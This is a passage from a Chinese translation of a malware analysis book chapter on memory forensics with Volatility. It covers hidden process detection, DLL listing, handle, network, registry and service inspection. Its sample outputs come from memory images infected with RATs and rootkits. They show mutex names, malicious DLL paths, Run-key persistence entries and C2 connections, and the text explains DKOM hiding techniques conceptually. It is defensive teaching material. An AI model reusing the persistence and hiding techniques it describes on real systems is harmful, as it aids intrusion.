(pid 1700)，它在pslist中不存在:\n$ python vol.py -f infected.vmem --profile=WinXPSP3x86 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start --------- ------------- ---- ---- ---- ---- ---- ----- ------------------- 0x819cc830 System 4 0 56 256 ---- 0 0x814d8380 smss.exe 380 43 19 ---- 0 2014-06-11 14:49:36 0x818a1868 csrss.exe 632 380 11 423 0 0 2014-06-11 14:49:36 0x813dc1a8 winlogon.exe 656 380 24 524 0 0 2014-06-11 14:49:37 0x81659020 services.exe 700 656 15 267 0 0 2014-06-11 14:49:37 0x81657910 lsass.exe 712 656 24 355 0 0 2014-06-11 14:49:37 0x813d7688 svchost.exe 884 700 21 199 0 0 2014-06-11 14:49:37 0x818f5d10 svchost.exe 964 700 10 235 0 0 2014-06-11 14:49:38 0x813cf5a0 svchost.exe 1052 700 84 1467 0 0 2014-06-11 14:49:38 0x8150b020 svchost.exe 1184 700 16 211 0 0 2014-06-11 14:49:40 0x81506c68 spoolsv.exe 1388 700 15 131 0 0 2014-06-11 14:49:40 0x81387710 explorer.exe 1456 1252 16 459 0 0 2014-06-11 14:49:55 $ python vol.py -f infected.vmem --profile=WinXPSP3x86 psscan Volatility Foundation Volatility Framework 2.6 Offset(P) Name PID PPID PDB Time created ------------------ ------------ ---- ---- ---------- ------------------- 0x0000000001587710 explorer.exe 1456 1252 0x08440260 2014-06-11 14:49:55 0x00000000015cf5a0 svchost.exe 1052 700 0x08440120 2014-06-11 14:49:38 0x00000000015d7688 svchost.exe 884 700 0x084400e0 2014-06-11 14:49:37 0x00000000015dc1a8 winlogon.exe 656 380 0x08440060 2014-06-11 14:49:37 0x00000000016ba360 nvid.exe 1700 1660 0x08440320 2014-10-17 09:16:10 0x00000000016d8380 smss.exe 380 4 0x08440020 2014-06-11 14:49:36 0x0000000001706c68 spoolsv.exe 1388 700 0x084401a0 2014-06-11 14:49:40 0x000000000170b020 svchost.exe 1184 700 0x08440160 2014-06-11 14:49:40 0x0000000001857910 lsass.exe 712 656 0x084400a0 2014-06-11 14:49:37 0x0000000001859020 services.exe 700 656 0x08440080 2014-06-11 14:49:37 0x0000000001aa1868 csrss.exe 632 380 0x08440040 2014-06-11 14:49:36 0x0000000001af5d10 svchost.exe 964 700 0x08440100 2014-06-11 14:49:38 0x0000000001bcc830 System 4 0 0x003190004.2.2 了解池标签扫描 如果您还记得，我以前将进程、文件、线程等系统资源称为对象(或执行对象)。执行对象称为对象管理器的内核组件管理。每个执行对象都有一个与之相关联的结构(例如进程对象的_EPROCESS)。执行对象结构前面有一个_OBJECT_HEADER结构，它包含关于对象类型和一些引用计数器的信息。然后在_OBJECT_HEADER前面加上零个或多个可选头。换句话说，你可以把对象看作是执行对象结构、对象头和可选头的组合，如下图所示: 要存储对象，需要内存，而这些内存是由Windows内存管理器从内核池中分配的。内核池是一段内存，可以划分为更小的块，用于存储对象等数据。池分为分页池(其内容可以交换到磁盘)和非分页池(其内容永久驻留在内存中)。对象(如进程和线程)保存在内核中的一个非分页池中，这意味着它们将始终驻留在物理内存中。\n当Windows内核接收到创建对象的请求时(可能是由于CreateProcess或CreateFile等进程的API调用)，内存会从分页池或非分页池(取决于对象类型)分配给对象。通过在对象前加上_POOL_HEADER结构来标记这个分配，因此在内存中，每个对象都有一个可预测的结构，类似于下面截图中显示的结构。_POOL_HEADER结构包括一个名为PoolTag的字段，该字段包含一个四字节标记(称为池标记)。这个池标记可以用来标识一个对象。对于进程对象，标记是Proc，对于文件对象，标记是File，依此类推。_POOL_HEADER结构还包含告诉分配大小和内存类型(分页或非分页池)的字段，它描述:\n你可以认为所有驻留在内核内存的非分页池中的进程对象(最终映射到物理内存)都被标记为一个标记，Proc正是这个标记被挥发的psscan用作识别进程对象的起点。特别是，它扫描物理内存中的Proc标记，以识别与进程对象关联的池标记分配，并通过使用更健壮的签名和启发式进一步确认它。一旦psscan找到进程对象，它就从它的_EPROCESS结构中提取必要的信息。psscan重复这个过程，直到找到所有的进程对象。事实上，许多Volatility插件依赖池标签扫描来识别和提取内存图像中的信息。\n由于使用的方法不同，psscan插件不仅可以检测隐藏的进程，还可以检测终止的进程。当一个对象被销毁(例如当一个进程终止),包含该对象的内存分配释放回内核的内存池,但内存中的内容不是立即覆盖,这意味着进程对象仍然可以在内存,除非内存是分配给一个不同的目标。如果包含终止进程对象的内存没有被覆盖，那么psscan可以检测到终止的进程。\n关于池标签扫描的详细信息，请参考Andreas Schuster的论文search For Processes and Threads in Microsoft Windows Memory Dumps，或者阅读《The Art of Memory Forensics.内存鉴定的艺术》一书。\n在这一点上，您应该了解了Volatility插件是如何工作的;大多数插件使用类似的逻辑。总之，关键信息存在于内核维护的数据结构中。插件依赖于从这些数据结构中查找和提取信息。寻找和提取司法证据的方法各不相同;一些插件依赖于浏览双重链接列表(如pslist)，一些使用池标记扫描技术(如psscan)来提取相关信息。\n4.3 确定过程的关系 在检查进程时，确定进程之间的父/子关系可能会很有用。在恶意软件调查期间，这将帮助您了解其他哪些进程与恶意进程相关。pstree插件通过使用来自pslist的输出并将其格式化为树状视图来显示父-子进程关系。在下面的例子中，针对受感染的内存映像运行pstree插件会显示进程关系;子进程向右缩进并在前面加上句点。从输出中，您可以看到OUTLOOK.EXE是由explorer.exe进程启动的。这很正常，因为每当您通过双击启动应用程序时，都是资源管理器启动该应用程序。OUTLOOK.EXE (pid 4068)启动了EXCEL.EXE (pid 1124)，反过来调用cmd.exe (pid 4056)来执行恶意程序进程doc6.exe (pid 2308)。通过查看这些事件，你可以假设用户打开了一个通过电子邮件发送的恶意Excel文档，该文档可能利用了一个漏洞或执行了一个宏代码来删除恶意软件，并通过cmd.exe执行:\n$ python vol.py -f infected.raw --profile=Win7SP1x86 pstree Volatility Foundation Volatility Framework 2.6 Name Pid PPid Thds Hnds Time ------------------------ ---- ----- ---- ---- ------------------- [REMOVED] 0x86eb4780:explorer.exe 1608 1572 35 936 2016-05-11 12:15:10 . 0x86eef030:vmtoolsd.exe 1708 1608 5 160 2016-05-11 12:15:10 . 0x851ee2b8:OUTLOOK.EXE 4068 1608 17 1433 2018-04-15 02:14:23 .. 0x8580a3f0:EXCEL.EXE 1124 4068 11 377 2018-04-15 02:14:35 ... 0x869d1030:cmd.exe 4056 1124 5 117 2018-04-15 02:14:41 .... 0x85b02d40:doc6.exe 2308 4056 1 50 2018-04-15 02:14:59由于pstree插件依赖于pslist插件，所以它不能列出隐藏或终止的进程。另一种确定进程关系的方法是使用psscan插件生成父/子关系的可视化表示。的 以下psscan命令将输出输出打印成点格式，然后可以使用图形可视化软件，如Graphviz (https://www.graphviz.org/)或XDot(可以使用sudo apt install XDot安装在Linux系统上)打开:\n$ python vol.py -f infected.vmem --profile=Win7SP1x86 psscan --output=dot - -output-file=infected.dot打开感染。XDot的dot文件显示了前面讨论的进程之间的关系: 4.4 使用psxview列出进程 在前面，您看到了如何操纵进程列表来隐藏进程;您还了解了psscan如何使用池标记扫描来检测隐藏的进程。事实证明，_POOL_HEADER (psscan所依赖的)只用于调试目的，它不会影响操作系统的稳定性。这意味着攻击者可以安装内核驱动程序在内核空间中运行，并修改池标记或_POOL_HEADER中的任何其他字段。通过修改池标记，攻击者可以阻止依赖池标记扫描的插件正常工作。换句话说，通过修改池标记，可以对psscan隐藏进程。为了克服这个问题，psxview插件依赖于从不同的来源提取进程信息。它以7种不同的方式列举了这个过程。通过比较不同来源的输出，可以检测出恶意软件造成的差异。在下面的截图中，psxview使用7种不同的技术枚举了进程。每个进程的信息显示为一行，它使用的技术显示为包含True或False的列。特定列下的False值表示没有使用相应的方法找到进程。在接下来的输出，psxview使用除pslist方法外的所有方法检测隐藏进程nvid.exe (pid 1700): 在前面的屏幕截图中，您将注意到一些进程的值为假。例如，cmd.exe进程不存在于除psscan方法之外的任何方法中。你可能认为cmd.exe是隐藏的，但这不是真的;你看到False的原因是cmd.exe被终止了(你可以从ExitTime列告诉它)。结果，所有其他技术都无法在psscan能够找到它的地方找到它，因为池标记扫描可以检测终止的进程。换句话说，列中的False值并不一定意味着对该方法隐藏进程;它也可能意味着它是预期的(取决于该方法获取流程信息的方式和来源)。要知道它是否是预期的，可以使用下面的-r(——apply-rules)选项。在下面的截图中，请注意False值是如何被替换为Okay的。ok表示False，但这是预期的行为。在使用-R(——apply-rules)运行psxview插件后，如果你仍然看到一个False值(例如在下面的截图中pid为1700的nvid.exe)，那么这是一个强烈的迹象，表明该方法隐藏了进程:\n5. 列出进程句柄 在调查过程中，一旦锁定了一个恶意进程，您可能想知道进程正在访问哪些对象(例如进程、文件、注册表项等等)。这将给您一个与恶意软件相关的组件的想法和洞察他们的操作，例如，一个键盘记录器可能正在访问一个日志文件来记录捕获的击键，或者恶意软件可能有一个打开的句柄到配置文件。\n要访问一个对象，进程首先需要通过调用CreateFile或CreateMutex之类的API来打开该对象的句柄。一旦它打开一个对象的句柄，它就使用这个句柄来执行后续操作，如写入文件或读取文件。句柄是对对象的间接引用;把句柄看作代表一个对象的东西(句柄不是对象本身)。对象驻留在内核内存中，而进程运行在用户空间中，因此进程不能直接访问对象，因此它使用代表该对象的句柄。\n每个进程都有一个私有句柄表，它驻留在内核内存中。该表包含所有与进程相关的内核对象，如文件、进程和网络套接字。问题是，如何填充这个表?当内核从进程获得创建对象的请求时(通过CreateFile之类的API)，该对象就会在内核内存中创建。指向该对象的指针放置在进程句柄表中第一个可用的槽位，并将相应的索引值返回给进程。索引值是表示该对象的句柄，该句柄被进程用来执行后续操作。\n在活动的系统上，您可以使用process Hacker工具检查特定进程访问的内核对象。为此，以管理员身份启动Process Hacker，右键单击任何进程，然后选择Handles选项卡。下面的截图显示了csrs.exe进程的进程句柄.exe是一个合法的操作系统进程，它在每个进程和线程的创建过程中发挥作用。由于这个原因，你会看到css.exe打开了系统上运行的大部分进程(除了它自己和它的父进程)的句柄。在下面的截图中，第三列是句柄值，第四列是内核内存中对象的地址。例如，第一个进程wininit.exe位于内核内存中的地址0x8705c410(它的_EPROCESS结构的地址)，表示该对象的句柄值为0x60:\npsxview插件使用的一种方法依赖于遍历csrs.exe进程的句柄表来识别进程对象。如果有多个csrs.exe实例，psxview解析所有csrs.exe实例的句柄表，列出正在运行的进程，除了csrs.exe进程及其父进程(sms.exe和系统进程)。\n从内存映像中，您可以获得一个进程使用handles插件访问的所有内核对象的列表。下面的截图显示了pid为356的进程的句柄。如果你运行不带-p选项的handles插件，它将显示所有进程的句柄信息: 您还可以使用-t选项过滤特定对象类型(File、Key、Process、Mutant等等)的结果。在下面的例子中，对感染了Xtreme RAT病毒的内存映像运行了handles插件。handles插件用于列出恶意进程打开的互斥锁(pid 1772)。从下面的输出中，您可以看到Xtreme RAT创建了一个名为oZ694XMhk6yxgbTA0的互斥锁，以标记它在系统中的存在。像Xtreme RAT创建的互斥锁可以作为一个很好的基于主机的指示器，用于基于主机的监控:\n$ python vol.py -f xrat.vmem --profile=Win7SP1x86 handles -p 1772 -t Mutant Volatility Foundation Volatility Framework 2.6 Offset(V) Pid Handle Access Type Details ---------- ---- ------ -------- ------ ----------------------------- 0x86f0a450 1772 0x104 0x1f0001 Mutant oZ694XMhk6yxgbTA0 0x86f3ca58 1772 0x208 0x1f0001 Mutant _!MSFTHISTORY!_ 0x863ef410 1772 0x280 0x1f0001 Mutant WininetStartupMutex 0x86d50ca8 1772 0x29c 0x1f0001 Mutant WininetConnectionMutex 0x8510b8f0 1772 0x2a0 0x1f0001 Mutant WininetProxyRegistryMutex 0x861e1720 1772 0x2a8 0x100000 Mutant RasPbFile 0x86eec520 1772 0x364 0x1f0001 Mutant ZonesCounterMutex 0x86eedb18 1772 0x374 0x1f0001 Mutant ZoneAttributeCacheCounterMutex在下面这个被TDL3 rootkit感染的内存映像的例子中，svchos.exe进程(pid 880)打开了恶意DLL和与rootkit相关的内核驱动程序的文件句柄:\n$ python vol.py -f tdl3.vmem handles -p 880 -t File Volatility Foundation Volatility Framework 2.6 Offset(V) Pid Handle Access Type Details ---------- --- ------ -------- ---- ---------------------------- 0x89406028 880 0x50 0x100001 File \\Device\\KsecDD 0x895fdd18 880 0x100 0x100000 File \\Device\\Dfs [REMOVED] 0x8927b9b8 880 0x344 0x120089 File [REMOVED]\\system32\\TDSSoiqh.dll 0x89285ef8 880 0x34c 0x120089 File [REMOVED]\\system32\\drivers\\TDSSpqxt.sys6. DLL清单 在本书中，你已经看到了使用DLL实现恶意功能的恶意软件的例子。因此，除了调查进程之外，您可能还希望检查已加载的库列表。要列出加载的模块(可执行和dll)，你可以使用Volatility的dlllist插件。dlllist插件还会显示与进程相关的完整路径。让我们以一个名为Ghost RAT的恶意软件为例。它以服务DLL的形式实现恶意功能，因此，该恶意DLL通过svchost.exe进程加载(有关服务DLL的更多信息，请参阅第7章“恶意软件功能和持久性”中的服务部分)。下面是dlllist的输出，在这里您可以看到一个由svchost.exe进程(pid 800)加载的带有非标准扩展名(.ddf)的可疑模块。第一列Base指定Base地址，也就是加载模块的内存中的地址:\n$ python vol.py -f ghost.vmem --profile=Win7SP1x86 dlllist -p 880 Volatility Foundation Volatility Framework 2.6 ****************************************************************** svchost.exe pid: 880 Command line : C:\\Windows\\system32\\svchost.exe -k netsvcs Base Size LoadCount Path ---------- -------- --------- -------------------------------- 0x00f30000 0x8000 0xffff 0x76f60000 0x13c000 0xffff 0x75530000 0xd4000 0xffff 0x75160000 0x4a000 0xffff 0x75480000 0xac000 0xffff 0x77170000 0x19000 0xffff 0x76700000 0x15c000 0x62 0x76c30000 0x4e000 0x19c 0x770a0000 0xc9000 0x1cd [REMOVED] C:\\Windows\\system32\\svchost.exe C:\\Windows\\SYSTEM32\\ntdll.dll C:\\Windows\\system32\\kernel32.dll C:\\Windows\\system32\\KERNELBASE.dll C:\\Windows\\system32\\msvcrt.dll C:\\Windows\\SYSTEM32\\sechost.dll C:\\Windows\\system32\\ole32.dll C:\\Windows\\system32\\GDI32.dll C:\\Windows\\system32\\USER32.dll 0x74fe0000 0x4b000 0xffff 0x6bbb0000 0xf000 0x1 0x10000000 0x26000 0x1 data\\acdsystems\\acdsee\\imageik.ddf 0x71200000 0x32000 0x3 C:\\Windows\\system32\\WINMM.dll dlllist插件从一个名为进程环境块(PEB)的结构中获取所加载模块的信息。如果你回想一下第8章，代码注入和挂钩，当谈到进程内存组件时，我提到过PEB结构驻留在进程内存中(在用户空间中)。PEB包含关于可执行进程在何处加载的元数据信息、它在磁盘上的完整路径以及关于加载的模块(可执行和dll)的信息。dlllist插件查找每个进程的PEB结构并获取上述信息。那么问题来了，如何找到PEB的结构?_EPROCESS结构有一个名为Peb的字段，该字段包含指向Peb的指针。这意味着一旦插件找到_EPROCESS结构，它就可以找到PEB。需要记住的一点是，_EPROCESS驻留在内核内存(内核空间)中，而PEB驻留在进程内存(用户空间)中。\n要在调试器中获得PEB的地址，可以使用!process扩展命令，它显示_EPROCESS结构的地址。它还指定PEB的地址。从下面的输出中，你可以看到explorer.exe进程的PEB在它的进程内存地址7ffd3000，它的_EPROCESS结构在0x877ced28(在它的内核内存中):\nkd\u003e !process 0 0 **** NT ACTIVE PROCESS DUMP **** ......... PROCESS 877cb4a8 SessionId: 1 Cid: 05f0 Peb: 7ffdd000 ParentCid: 0360 DirBase: beb47300 ObjectTable: 99e54a08 HandleCount: 70. Image: dwm.exe PROCESS 877ced28 SessionId: 1 Cid: 0600 Peb: 7ffd3000 ParentCid: 05e8 DirBase: beb47320 ObjectTable: 99ee5890 HandleCount: 766. Image: explorer.exe另一种确定PEB地址的方法是使用display type (dt)命令。你可以通过检查EPROCESS结构中的PEB字段找到explorer.exe进程的PEB地址，如下所示:\nkd\u003e dt nt!_EPROCESS 877ced28 [REMOVED] +0x168 Session : 0x8f44e000 Void +0x16c ImageFileName : [15] \"explorer.exe\" [REMOVED] +0x1a8 Peb : 0x7ffd3000 _PEB +0x1ac PrefetchTrace : _EX_FAST_REF现在你知道如何找到PEB，那么现在，让我们试着理解PEB包含什么样的信息。要获得给定流程的可读的PEB摘要，首先需要切换到要检查其PEB的流程的上下文。这可以使用.process扩展名命令来完成。这个命令接受_EPROCESS结构的地址。下面的命令将当前进程的上下文设置为explorer.exe进程:\nkd\u003e .process 877ced28 Implicit process is now 877ced28然后，您可以使用!peb扩展命令后跟peb地址。在下面的输出中，为了简洁起见，部分信息被截断。ImageBaseAddress字段指定在内存中加载进程可执行文件(explorer.exe)的地址。PEB还包含另一个称为Ldr结构(类型为_PEB_LDR_DATA)的结构，它维护三个双链接列表，它们是InLoadOrderModuleList, InMemoryOrderModuleList，和InInitializationOrderModuleList。这三个双链接列表中的每一个都包含关于模块(进程可执行文件和dll)的信息。通过遍历这些双链接的模块，可以获得关于模块的信息 列表。InLoadOrderModuleList按模块的顺序组织模块 InMemoryOrderModuleList按照它们在进程内存中的顺序组织模块，而InInitializationOrderModuleList按照它们的DllMain函数执行的顺序组织模块:\nkd\u003e !peb 0x7ffd3000 PEB at 7ffd3000 InheritedAddressSpace: No ReadImageFileExecOptions: No BeingDebugged: No ImageBaseAddress: 000b0000 Ldr 77dc8880 Ldr.Initialized: Yes Ldr.InInitializationOrderModuleList: 00531f98 . 03d3b558 Ldr.InLoadOrderModuleList: 00531f08 . 03d3b548 Ldr.InMemoryOrderModuleList: 00531f10 . 03d3b550 [REMOVED]换句话说，所有三个PEB列表都包含关于已加载模块的信息，比如基址、大小、与模块关联的完整路径，等等。要记住的重要一点是，InInitializationOrderModuleList将不包含关于进程可执行文件的信息，因为与dll相比，可执行文件的初始化是不同的。\n为了帮助您更好地理解，下面的图表以Explorer.exe为例(该概念也类似于其他进程)。当Explorer.exe被执行时，它的进程可执行文件被加载到进程内存中的某个地址(比方说0xb0000)，带有PAGE_EXECUTE_WRITECOPY (WCX)保护。相关的dll也被加载到进程内存中。进程内存还包括PEB结构，它包含了explorer.exe在内存中的加载位置(基址)的元数据信息。PEB中的Ldr结构维持着三个双链表;每个元素都是一个结构(类型为_LDR_DATA_TABLE_ENTRY)，它包含关于加载模块的信息(基址、完整路径等)。dlllist插件依赖于遍历InLoadOrderModuleList来获取模块的信息: 从这三个PEB列表中获取模块信息的问题是，它们容易受到DKOM攻击。所有三个PEB列表都驻留在用户空间中，这意味着攻击者可以将恶意DLL加载到进程的地址空间中，并可以从一个或所有PEB列表中断开恶意DLL的链接，以隐藏依赖于遍历这些列表的工具。为了克服这个问题，我们可以使用另一个名为ldrmodules的插件。\n6.1 使用ldrmodule检测隐藏的DLL ldrmodules插件将来自三个PEB列表(在进程内存中)的模块信息与来自内核内存中称为VADs(虚拟地址描述符)的数据结构的信息进行比较。内存管理器使用vad跟踪进程内存中保留(或空闲)的虚拟地址。VAD是一种二叉树结构，它存储关于进程内存中几乎连续的内存区域的信息。对于每个进程，内存管理器维护一组VAD，每个VAD节点描述一个几乎连续的内存区域。如果进程内存区域包含一个内存映射文件(如可执行文件、DLL)，那么VAD节点存储有关其基址、文件路径和内存保护的信息。下面的示例应该有助于您理解这个概念。在下面的截图中，内核空间中的一个VAD节点描述了关于进程可执行文件(explorer.exe)加载位置、它的完整路径和内存保护的信息。类似地，其他VAD节点将描述进程的内存范围，包括那些包含映射的可执行映像，如dll: 为了获得模块的信息，ldrmodules插件枚举所有包含映射可执行镜像的VAD节点，并将结果与三个PEB列表进行比较，以确定是否存在差异。下面是感染了TDSS rootkit(我们在前面看到的)的内存映像进程的模块列表。你可以看到ldrmodules插件能够识别一个名为TDSSoiqh.dll的恶意DLL，它隐藏了所有三个PEB列表(InLoad, InInit和InMem)。svchost.exe的InInit值设置为False，但其是可执行的，如前所述:\n$ python vol.py -f tdl3.vmem --profile=WinXPSP3x86 ldrmodules -p 880 Volatility Foundation Volatility Framework 2.6 Pid Process Base InLoad InInit InMem MappedPath --- ----------- -------- ----- ------- ----- ---------------------------- 880 svchost.exe 0x10000000 False False False \\WINDOWS\\system32\\TDSSoiqh.dll 880 svchost.exe 0x01000000 True False True \\WINDOWS\\system32\\svchost.exe 880 svchost.exe 0x76d30000 True True True \\WINDOWS\\system32\\wmi.dll 880 svchost.exe 0x76f60000 True True True \\WINDOWS\\system32\\wldap32.dll [REMOVED]7. 转储可执行文件和DLL 在您识别出恶意进程或DLL之后，您可能希望转储它以便进一步调查(例如提取字符串、运行yara规则、反汇编或使用杀毒软件进行扫描)。要将进程可执行文件从内存转储到磁盘，可以使用procdump插件。要转储进程可执行文件，您需要知道它的进程ID或物理偏移量。在下面的例子中，一个内存镜像感染了Perseus恶意软件(之前在讨论pslist插件时提到)， procdump插件用于转储其恶意进程的可执行文件svchost.exe (pid 3832)。使用-D(——dump-dir)选项，可以指定要转储可执行文件的目录名称。转储文件以进程的pid命名，如executable.PID.exe:\n$ python vol.py -f perseus.vmem --profile=Win7SP1x86 procdump -p 3832 -D dump/ Volatility Foundation Volatility Framework 2.6 Process(V) ImageBase Name Result ---------- ---------- ------------ ----------------------- 0x8503f0e8 0x00b90000 svchost..exe OK: executable.3832.exe $ cd dump $ file executable.3832.exe executable.3832.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows 要转储具有物理偏移量的进程，可以使用-o(——offset)选项，如果希望从内存转储隐藏进程，该选项很有用。在下面的例子中，一个内存映像感染了prolaco恶意软件(在前面讨论时已经讨论过了psscan插件)，隐藏进程使用其物理偏移量转储。物理偏移量由psscan插件确定。你也可以从psxview插件获取物理偏移量。当使用procdump插件时，如果你没有指定-p(——pid)或-o(——offset)选项，那么它将转储系统上运行的所有活动进程的进程可执行文件:\n$ python vol.py -f infected.vmem --profile=WinXPSP3x86 psscan Volatility Foundation Volatility Framework 2.6 Offset(P) Name PID PPID PDB Time created ------------------ ------- ---- ---- ---------- -------------------- [REMOVED] 0x00000000016ba360 nvid.exe 1700 1660 0x08440320 2014-10-17 09:16:10 $ python vol.py -f infected.vmem --profile=WinXPSP3x86 procdump -o 0x00000000016ba360 -D dump/ Volatility Foundation Volatility Framework 2.6 Process(V) ImageBase Name Result ---------- ---------- -------- ----------------------- 0x814ba360 0x00400000 nvid.exe OK: executable.1700.exe类似于进程可执行文件，您可以使用dlldump插件将恶意DLL转储到磁盘。要转储DLL，您需要指定加载DLL的进程的进程ID (-p选项)，以及DLL的base地址，使用-b(——base)选项。您可以从dlllist或ldrmodules输出中获得DLL的基址。在下面这个例子中，一个被Ghost RAT病毒感染的内存映像(我们在讨论dlllist插件时提到过)，通过使用dlldump插件来转储svchos.exe (pid 880)进程加载的恶意DLL:\n$ python vol.py -f ghost.vmem --profile=Win7SP1x86 dlllist -p 880 Volatility Foundation Volatility Framework 2.6 ************************************************************************ svchost.exe pid: 880 Command line : C:\\Windows\\system32\\svchost.exe -k netsvcs Base Size LoadCount Path ---------- ------ -------- ------ [REMOVED] 0x10000000 0x26000 0x1 c:\\users\\test\\application data\\acd systems\\acdsee\\imageik.ddf $ python vol.py -f ghost.vmem --profile=Win7SP1x86 dlldump -p 880 -b 0x10000000 -D dump/ Volatility Foundation Volatility Framework 2.6 Name Module Base Module Name Result ---------- ------------ ---------------- -------------------------- svchost.exe 0x010000000 imageik.ddf module.880.ea13030.10000000.dll8. 列出网络连接和套接字 大多数恶意程序执行一些网络活动，或者下载额外的组件，从攻击者那里接收命令，窃取数据，或者在系统上创建一个远程后门。检查网络活动将帮助您确定被感染系统上的恶意软件的网络操作。在许多情况下，将在受感染系统上运行的进程与网络上检测到的活动关联起来是很有用的。要确定pre-vista系统(如Windows XP和2003)上的活动网络连接，可以使用连接插件。下面的命令显示了一个使用连接插件打印来自被BlackEnergy恶意软件感染的内存转储的活动连接的示例。从下面的输出中，可以看到进程ID为756的进程负责端口443上的C2通信。运行pslist插件后，你可以知道756的pid与svchost.exe进程相关联:\n$ python vol.py -f be3.vmem --profile=WinXPSP3x86 connections Volatility Foundation Volatility Framework 2.6 Offset(V) Local Address Remote Address Pid ---------- ------------------ -------------- ------- 0x81549748 192.168.1.100:1037 X.X.32.230:443 756 $ python vol.py -f be3.vmem --profile=WinXPSP3x86 pslist -p 756 Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start ---------- ----------- --- ---- ---- ---- ---- ------ -------------------- 0x8185a808 svchost.exe 756 580 22 442 0 0 2016-01-13 18:38:10另一个插件，你可以用来列出的网络连接在vista之前的系统是connscan。它使用池标记扫描方法来确定连接。因此，它还可以检测终止的连接。在下面的例子中，内存映像感染了TDL3 rootkit，连接插件不返回任何结果，而connscan插件显示网络连接。这并不一定意味着连接是隐藏的，它只是意味着当获取内存映像时，网络连接不是活动的(或终止的):\n$ python vol.py -f tdl3.vmem --profile=WinXPSP3x86 connections Volatility Foundation Volatility Framework 2.6 Offset(V) Local Address Remote Address Pid ---------- ------------- -------------- ---- $ python vol.py -f tdl3.vmem --profile=WinXPSP3x86 connscan Volatility Foundation Volatility Framework 2.6 Offset(P) Local Address ---------- ------------------ 0x093812b0 192.168.1.100:1032 Remote Address Pid Proto Local Address Foreign Address TCPv4 192.168.1.60:139 0.0.0.0:0 UDPv4 192.168.1.60:137 *:* UDPv4 0.0.0.0:0 *:* State LISTENING Pid Owner 4 System --------------- XX.XXX.92.121:80 880有时，您可能希望获得有关打开的套接字及其相关进程的信息。在vista之前的系统上，你可以通过socket和sockscan插件获取开放端口的信息。socket插件打印打开的socket列表，sockscan插件使用池标记扫描方法。因此，它可以检测已经关闭的端口。\n在Vista和以后的系统(如Windows 7)，你可以使用netscan插件来显示网络连接和套接字。netscan插件使用池标记扫描方法，类似于sockscan和connscan插件。在下面的例子中，内存映像被Darkcomet RAT病毒感染，netscan插件在81端口上显示C2通信，该通信已被恶意进程dmt.exe (pid 3768)造成: 9. 检查注册表 从取证的角度来看，注册表可以提供关于恶意软件上下文的有价值的信息。在第7章“恶意软件功能和持久性”中讨论持久性方法时，您看到了恶意程序如何在注册表中添加条目以在重新启动时存活下来。除了持久性之外，恶意软件还使用注册表来存储配置数据、加密密钥等。要打印注册表键、子键及其值，可以使用printkey插件，通过使用-K(——key)参数提供所需的注册表键路径。在下面的例子中，一个感染了Xtreme Rat病毒的内存映像中，它在Run注册表项中添加了恶意的可执行文件C:\\Windows\\InstallDir\\system.exe。因此，恶意的可执行文件将在每次系统启动时被执行:\n$ python vol.py -f xrat.vmem --profile=Win7SP1x86 printkey -K \"Microsoft\\Windows\\CurrentVersion\\Run\" Volatility Foundation Volatility Framework 2.6 Legend: (S) = Stable (V) = Volatile ---------------------------- Registry: \\SystemRoot\\System32\\Config\\SOFTWARE Key name: Run (S) Last updated: 2018-04-22 06:36:43 UTC+0000 Subkeys: Values: REG_SZ VMware User Process : (S) \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr REG_EXPAND_SZ HKLM : (S) C:\\Windows\\InstallDir\\system.exe在下面的例子中，Darkcomet RAT在注册表中添加了一个条目，通过rundll32.exe加载它的恶意DLL (mph.DLL):\n$ python vol.py -f darkcomet.vmem --profile=Win7SP1x86 printkey -K \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\" Volatility Foundation Volatility Framework 2.6 Legend: (S) = Stable (V) = Volatile ---------------------------- Registry: \\??\\C:\\Users\\Administrator\\ntuser.dat Key name: Run (S) Last updated: 2016-09-23 10:01:53 UTC+0000 Subkeys: Values: REG_SZ Adobe cleanup : (S) rundll32.exe \"C:\\Users\\Administrator\\Local Settings\\Application Data\\Adobe updater\\mph.dll\", StartProt ----------------------------还有一些其他的注册表键以二进制形式存储有价值的信息，这对司法调查人员可能有很大的价值。诸如userassist、shellbags和shimcache等Volatility插件解析这些包含二进制数据的注册表键，并以可读性强得多的格式显示信息。\nUserassist注册表项包含用户在系统上执行的程序列表，以及程序运行的时间。要打印userassist注册信息，你可以使用挥发的userassist插件，如下所示。在下面的例子中，一个可疑的命名为可执行文件(info.doc.exe)被执行从E:\\驱动器(可能是USB驱动器)在2018-04-30 06:42:37:\n$ python vol.py -f inf.vmem --profile=Win7SP1x86 userassist Volatility Foundation Volatility Framework 2.6 ---------------------------- Registry: \\??\\C:\\Users\\test\\ntuser.dat [REMOVED] REG_BINARY E:\\info.doc.exe : Count: 1 Focus Count: 0 Time Focused: 0:00:00.500000 Last updated: 2018-04-30 06:42:37 UTC+0000 Raw Data: 0x00000000 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 0x00000010 00 00 80 bf 00 00 80 bf 00 00 80 bf 00 00 80 bf shimcache和shellbags插件在调查恶意软件事件时非常有用。shimcache插件对于证明系统中存在恶意软件以及它运行的时间很有帮助。shellbags插件可以提供关于访问文件、文件夹、外部存储设备和网络资源的信息。\n10. nvestigating服务 在第7章，恶意软件的功能和持久性中，我们研究了攻击者如何通过安装或修改现有的服务来在系统上持久存在。在本节中，我们将重点讨论如何从内存映像研究服务。要从内存映像中列出服务及其信息，比如显示名称、服务类型和启动类型，可以使用svcscan插件。在下面的例子中，恶意软件创建了一个WIN32_OWN_PROCESS类型的服务，显示名称和服务名称为svchost。从二进制路径可以看出，svchost.exe是恶意的，因为它运行在非标准路径C:\\Windows，而不是C:\\Windows\\System32:\n$ python vol.py -f svc.vmem --profile=Win7SP1x86 svcscan Volatility Foundation Volatility Framework 2.6 [REMOVED] Offset: 0x58e660 Order: 396 Start: SERVICE_AUTO_START Process ID: 4080 Service Name: svchost Display Name: svchost Service Type: SERVICE_WIN32_OWN_PROCESS Service State: SERVICE_RUNNING Binary Path: 